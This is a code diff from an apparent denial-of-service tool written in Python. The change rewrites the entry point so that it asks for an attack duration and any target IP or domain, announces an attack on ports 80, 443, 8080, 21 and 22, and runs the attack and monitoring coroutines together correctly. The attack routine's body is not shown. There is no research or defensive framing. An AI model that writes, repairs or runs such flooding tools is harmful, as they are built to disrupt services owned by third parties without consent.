@@ -83,12 +83,15 @@ async def attack(target: str, duration_minutes: int) -> None:
     finally:
         transport.close()
 
-if __name__ == "__main__":
+async def main():
     duration_minutes = int(input(f"{bcolors.HEADER}Enter the duration of the attack in minutes: {bcolors.ENDC}"))
     target = input(f"{bcolors.HEADER}Enter the target IP or domain (e.g. 123.123.123.123 or www.example.com): {bcolors.ENDC}")
     print(f"{bcolors.OKGREEN}Attacking {target} on ports [80, 443, 8080, 21, 22] for {duration_minutes} minutes...{bcolors.ENDC}")
 
-    asyncio.run(asyncio.gather(
+    await asyncio.gather(
         attack(target, duration_minutes),
         monitor_status(target, duration_minutes * 60)
-    ))
+    )
+
+if __name__ == "__main__":
+    asyncio.run(main())
